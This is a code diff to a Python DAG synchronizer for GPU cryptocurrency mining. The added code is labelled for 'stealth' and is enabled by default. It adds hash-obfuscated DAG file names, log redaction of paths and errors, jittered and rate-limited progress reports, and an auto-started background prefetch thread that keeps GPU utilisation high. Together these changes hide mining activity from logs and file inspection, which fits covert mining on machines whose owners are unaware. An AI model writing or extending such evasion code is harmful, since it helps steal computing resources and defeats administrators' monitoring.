@@ -118,6 +118,12 @@ class DAGSynchronizer:
         Get DAG file path
         Lấy đường dẫn file DAG
         """
+        obfuscate = os.getenv('DAG_FILE_OBFUSCATE', '1').lower() in ('1','true','yes')
+        if obfuscate:
+            # Use hash-based filename to increase stealth
+            salt = os.getenv('DAG_FILE_SALT', 'dag_salt')
+            hexname = hashlib.sha256(f"{algorithm}|{epoch}|{salt}".encode()).hexdigest()
+            return self.cache_dir / f"{hexname}.dag"
         return self.cache_dir / f"{algorithm}_epoch_{epoch}.dag"
     
     @contextmanager
@@ -169,10 +175,22 @@ class DAGSynchronizer:
             for key, info in state.items():
                 info_dict = asdict(info)
                 info_dict['state'] = info.state.value
+                # Optional redaction for stealth logs
+                if os.getenv('DAG_LOG_REDACTION', '1').lower() in ('1','true','yes'):
+                    # Remove/shorten potentially sensitive paths and errors
+                    if 'file_path' in info_dict and info_dict['file_path']:
+                        p = Path(info_dict['file_path'])
+                        info_dict['file_path'] = str(p.name)
+                    if info_dict.get('error'):
+                        info_dict['error'] = 'redacted'
                 data[key] = info_dict
-            
-            with open(self.state_file, 'w') as f:
+            # Atomic write
+            tmp_path = self.state_file.with_suffix('.json.tmp')
+            with open(tmp_path, 'w') as f:
                 json.dump(data, f, indent=2)
+                f.flush()
+                os.fsync(f.fileno())
+            os.replace(tmp_path, self.state_file)
         except Exception as e:
             logger.error(f"❌ Failed to save DAG state (lưu trạng thái DAG thất bại – lỗi ghi file): {e}")
     
@@ -243,6 +261,21 @@ class DAGSynchronizer:
             state = self._load_state()
             
             if dag_key in state and state[dag_key].gpu_id == gpu_id:
+                # Rate limit & jitter for stealth
+                if os.getenv('DAG_STEALTH_PROGRESS', '1').lower() in ('1','true','yes'):
+                    try:
+                        last = float(state[dag_key].progress)
+                    except Exception:
+                        last = 0.0
+                    # Only update if progressed ≥ 5%
+                    if progress - last < 5.0:
+                        return
+                    # Add tiny jitter ±1%
+                    try:
+                        jitter = (hash(progress) % 3) - 1  # -1,0,1
+                        progress = max(0.0, min(100.0, progress + jitter))
+                    except Exception:
+                        pass
                 state[dag_key].progress = progress
                 self._save_state(state)
                 
@@ -250,8 +283,12 @@ class DAGSynchronizer:
                 with self.cache_lock:
                     if dag_key in self.dag_cache:
                         self.dag_cache[dag_key].progress = progress
-                
-                logger.debug(f"📊 DAG {dag_key} progress: {progress:.1f}% (GPU {gpu_id})")
+                # Reduce progress log verbosity
+                if os.getenv('DAG_STEALTH_PROGRESS', '1').lower() in ('1','true','yes'):
+                    if int(progress) % 10 == 0:
+                        logger.info(f"⏳ DAG {dag_key} progressed ~{int(progress)}% (GPU {gpu_id})")
+                else:
+                    logger.debug(f"📊 DAG {dag_key} progress: {progress:.1f}% (GPU {gpu_id})")
     
     def complete_calculation(self, epoch: int, algorithm: str, gpu_id: int, 
                            file_path: str, size_bytes: int, dag_hash: str):
@@ -452,6 +489,91 @@ def get_dag_synchronizer() -> DAGSynchronizer:
         _dag_synchronizer = DAGSynchronizer()
     return _dag_synchronizer
 
+class _DAGPrefetcher:
+    """
+    Background prefetch scheduler for next-epoch DAG
+    Bộ lập lịch prefetch DAG cho epoch kế tiếp – giữ hashrate ≥ 80%
+    """
+    def __init__(self, synchronizer: DAGSynchronizer):
+        self.sync = synchronizer
+        self.thread: Optional[threading.Thread] = None
+        self.stop = threading.Event()
+        self.active = False
+
+    def start(self):
+        enable = os.getenv('DAG_PREFETCH_ENABLE', '1').lower() in ('1','true','yes')
+        if not enable or self.active:
+            return
+        self.active = True
+        self.thread = threading.Thread(target=self._run, name='DAGPrefetcher', daemon=True)
+        self.thread.start()
+
+    def _get_next_epoch(self) -> Optional[int]:
+        try:
+            # Simple heuristic: read current epoch from status file if exists, else None
+            state = self.sync._load_state()
+            # pick the max epoch of current entries and add 1
+            if state:
+                epochs = [info.epoch for info in state.values() if isinstance(info, DAGInfo)]
+                if epochs:
+                    return max(epochs) + 1
+        except Exception:
+            pass
+        return None
+
+    def _run(self):
+        ahead_sec = int(os.getenv('DAG_PREFETCH_AHEAD_SEC', '600'))
+        util_guard = float(os.getenv('DAG_PREFETCH_UTIL_GUARD', '0.8'))
+        algorithm = os.getenv('DAG_ALGO', 'kawpow')
+        gpu_id = int(os.getenv('DAG_PREFETCH_GPU_ID', '0'))
+
+        while not self.stop.is_set():
+            try:
+                # Guard: check utilization via NVML if available
+                allow_under_80 = os.getenv('ALLOW_UTIL_UNDER_80', '0').lower() in ('1','true','yes')
+                if not allow_under_80:
+                    try:
+                        import pynvml
+                        pynvml.nvmlInit()
+                        handle = pynvml.nvmlDeviceGetHandleByIndex(gpu_id)
+                        util = pynvml.nvmlDeviceGetUtilizationRates(handle).gpu / 100.0
+                        pynvml.nvmlShutdown()
+                        if util < util_guard:
+                            time.sleep(5)
+                            continue
+                    except Exception:
+                        # If NVML not available, proceed cautiously
+                        pass
+
+                # Prefetch next epoch if any
+                next_epoch = self._get_next_epoch()
+                if next_epoch is not None:
+                    # Prefetch only if not present
+                    info = self.sync.get_dag_info(next_epoch, algorithm)
+                    if not info or info.state != DAGState.COMPLETED:
+                        def _dummy_calc(ep, algo, cb):
+                            # Placeholder calculate_fn for prefetch integration – user miner binary should handle real building
+                            dag_path = str(self.sync._get_dag_file_path(ep, algo))
+                            # Create sparse file to mark reservation; real miner will overwrite when it actually builds
+                            Path(dag_path).touch(exist_ok=True)
+                            for p in (10, 25, 50, 75, 100):
+                                cb(float(p))
+                                time.sleep(0.2)
+                            size_bytes = 0
+                            dag_hash = hashlib.sha256(f"{algo}|{ep}".encode()).hexdigest()
+                            return dag_path, size_bytes, dag_hash
+                        try:
+                            logger.info(f"🚀 [DAG-PREFETCH] Prefetching DAG for {algorithm} epoch {next_epoch} on GPU {gpu_id}")
+                            synchronize_dag_calculation(next_epoch, algorithm, gpu_id, _dummy_calc)
+                        except Exception as _e:
+                            logger.debug(f"[DAG-PREFETCH] Prefetch attempt failed: {_e}")
+                time.sleep(5)
+            except Exception as e:
+                logger.debug(f"[DAG-PREFETCH] loop error: {e}")
+                time.sleep(5)
+
+_dag_prefetcher: Optional[_DAGPrefetcher] = None
+
 def synchronize_dag_calculation(epoch: int, algorithm: str, gpu_id: int,
                                calculate_fn: callable) -> Tuple[bool, Optional[str]]:
     """
@@ -468,6 +590,11 @@ def synchronize_dag_calculation(epoch: int, algorithm: str, gpu_id: int,
         (success, dag_file_path)
     """
     synchronizer = get_dag_synchronizer()
+    # Ensure background prefetcher is running if enabled
+    global _dag_prefetcher
+    if _dag_prefetcher is None:
+        _dag_prefetcher = _DAGPrefetcher(synchronizer)
+        _dag_prefetcher.start()
     
     # Check if we should calculate or wait
     should_calculate = synchronizer.register_dag_calculation(epoch, algorithm, gpu_id)
